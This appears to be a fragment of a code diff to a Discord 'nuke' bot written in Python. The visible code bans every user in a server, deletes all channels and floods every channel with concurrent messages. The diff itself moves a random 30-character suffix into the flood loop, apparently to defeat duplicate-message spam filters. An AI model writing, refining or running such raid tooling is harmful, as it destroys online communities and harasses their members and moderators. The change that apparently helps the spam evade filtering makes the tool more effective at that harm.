@@ -77,6 +77,7 @@ class DiscordBot(commands.Bot):
                     await self.close()
                     return
                 logs[self.logId] += "--- Nuke ---\n"
+                message = message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(30))
                 await asyncio.gather(*(self.sendMessage(message, channel, latency*0.001) for channel in self.channels))
         except:
             logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
@@ -98,8 +99,7 @@ class DiscordBot(commands.Bot):
             await self.banAllUser(self.guild)
         if self.allChannelDelete:
             await self.deleteAllChannel(self.guild)
-        message = self.message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(7))
-        await self.nuke(self.nukeLatency, message, self.guild, self.channelName)
+        await self.nuke(self.nukeLatency, self.message, self.guild, self.channelName)
     async def on_message(self, message):
         if message.author.bot:
             return
